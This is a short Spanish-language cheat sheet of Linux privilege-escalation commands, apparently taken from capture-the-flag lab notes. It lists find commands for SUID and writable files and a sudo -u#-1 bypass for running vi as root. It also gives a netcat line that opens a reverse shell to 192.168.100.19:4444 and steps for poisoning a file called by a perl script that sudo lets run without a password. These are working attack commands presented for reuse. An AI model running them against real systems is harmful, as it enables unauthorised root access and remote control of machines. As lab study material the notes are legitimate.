# Buscar archivos binarios (SUID)
Ejemplo 1: `$ find /bin -perm -4000`

Ejemplo 2: `$ find / -user root -perm -4000 -exec ls -ldb {} \;`

Ejemplo 3: `$ find \-perm -4000 2>/dev/null`

Ejemplo: 4 `$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`

# Buscar archivos con permisos de escritura

`$ find \-writable 2>/dev/null`
___

# SUID (vi) vulnerability
`$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`

# nc vulnerability (old version)
`$ /bin/netcat -e /bin/bash 192.168.100.19 4444`

# Escalar privilegios aprovechando una tarea especifica
### Ejemplo

`$ www-data@THM-Chal:/home/itguy$ sudo -l`
	
	Matching Defaults entries for www-data on THM-Chal:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User www-data may run the following commands on THM-Chal:
		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
		
*Nota: debemos tener en cuenta a que archivo llama backup.pl para poder envenenar el archivo y ejecutarlo con permisos de administrador.*
### Ejecutar el archivo para escalar privilegios 
`$ sudo /usr/bin/perl /home/itguy/backup.pl`
